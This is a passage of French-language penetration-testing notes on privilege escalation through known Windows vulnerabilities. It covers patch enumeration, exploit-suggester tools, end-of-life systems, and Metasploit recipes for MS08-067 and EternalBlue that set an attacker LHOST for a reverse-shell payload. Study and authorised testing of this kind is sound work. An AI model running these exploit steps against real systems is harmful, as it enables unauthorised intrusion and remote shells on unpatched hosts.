# 09-Exploitation des Vulnérabilités Connues

Cette section traite de l'identification et de l'exploitation des vulnérabilités logicielles connues dans le système d'exploitation Windows, les services ou les applications installées.

## Identification des Vulnérabilités

**1. Énumération du Système et des Patchs**
```powershell
systeminfo
wmic qfe get HotFixID,InstalledOn,Description # Lister les patchs installés (KB)
Get-HotFix | ft -AutoSize
[environment]::OSVersion.Version # Version et build de Windows
```

**2. Outils d'Énumération Automatisée**
*   **WinPEAS :** Peut identifier des vulnérabilités courantes et des exploits potentiels.
*   **Windows Exploit Suggester (plusieurs versions) :**
    *   `wesng` (Windows Exploit Suggester Next Generation) : https://github.com/bitsadmin/wesng
        ```bash
        # Sur Kali, après avoir obtenu la sortie de systeminfo de la cible
        wesng --update
        wesng -s systeminfo.txt
        ```
    *   Sherlock : https://github.com/rasta-mouse/Sherlock
        ```powershell
        # Sur la cible
        # Import-Module .\Sherlock.ps1
        # Find-AllVulns
        ```

**3. Recherche Manuelle de Vulnérabilités**
Une fois la version de l'OS, les services en cours d'exécution et les applications installées identifiés, recherchez des exploits publics sur :
*   Exploit-DB : https://www.exploit-db.com/
*   CVE Details : https://www.cvedetails.com/
*   Google (ex: "Windows Server 2016 build X privilege escalation exploit")

## Exploitation des Vulnérabilités du Système d'Exploitation

### Exemple : MS08-067 (NetAPI)
Vulnérabilité affectant les anciennes versions de Windows (XP, Server 2003).
(Extrait de `02-windows-user-privileges.md`)
```bash
# Utiliser Metasploit
use exploit/windows/smb/ms08_067_netapi
set RHOSTS <IP_CIBLE>
set LHOST <IP_ATTAQUANT> # Pour le payload de reverse shell
# set PAYLOAD windows/meterpreter/reverse_tcp (ou autre)
exploit
```

### Exemple : MS17-010 (EternalBlue)
Affecte Windows 7, Server 2008 R2, et d'autres versions non patchées.
```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
# Configurer RHOSTS, LHOST, LPORT, PAYLOAD
exploit
```

## Exploitation des Vulnérabilités des Applications Installées

### Exemple : Docker pour Windows (CVE-2019–15752)
Une vulnérabilité dans Docker Desktop Community Edition avant 2.1.0.1 permettait une élévation de privilèges.
(Extrait de `04-things-to-add.md`)
> "Nous pouvons également rencontrer des situations où nous atterrissons sur un hôte exécutant une application vulnérable qui peut être utilisée pour élever les privilèges par interaction de l'utilisateur. [CVE-2019–15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) en est un excellent exemple. Il s'agissait d'une vulnérabilité dans Docker Desktop Community Edition avant la version 2.1.0.1"

L'exploitation spécifique dépendrait des détails de la CVE. Généralement, cela impliquerait d'interagir avec le service Docker d'une manière spécifique pour déclencher la vulnérabilité.

## Applications GUI Insecures
Recherchez les applications avec interface graphique (GUI) qui s'exécutent en tant que SYSTEM ou un autre utilisateur privilégié et qui pourraient avoir des fonctionnalités exploitables (par exemple, une fonction "exécuter une commande", une possibilité d'écrire des fichiers dans des emplacements arbitraires, ou des vulnérabilités de type "file open dialog" qui permettent de naviguer et d'exécuter des fichiers).

## Systèmes en Fin de Vie (End of Life - EOL)
Les systèmes qui ne reçoivent plus de mises à jour de sécurité sont des cibles de choix.
```powershell
# Identifier les systèmes EOL
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```
**Systèmes EOL courants et vulnérabilités associées :**
*   **Windows XP / Server 2003 :** Très vulnérables, MS17-010 (si SMBv1 activé), MS08-067, et de nombreux autres.
*   **Windows 7 / Server 2008 R2 (EOL Jan 2020, ESU jusqu'à Jan 2023/2024 pour certains) :** MS17-010, et d'autres vulnérabilités non patchées si les mises à jour ESU ne sont pas appliquées.
*   **Windows 8 / Server 2012 (EOL Jan 2023) :** Rechercher les CVE spécifiques non patchées.

Pour les systèmes EOL, les outils comme `Windows Exploit Suggester` sont particulièrement utiles car de nombreux exploits publics sont disponibles. 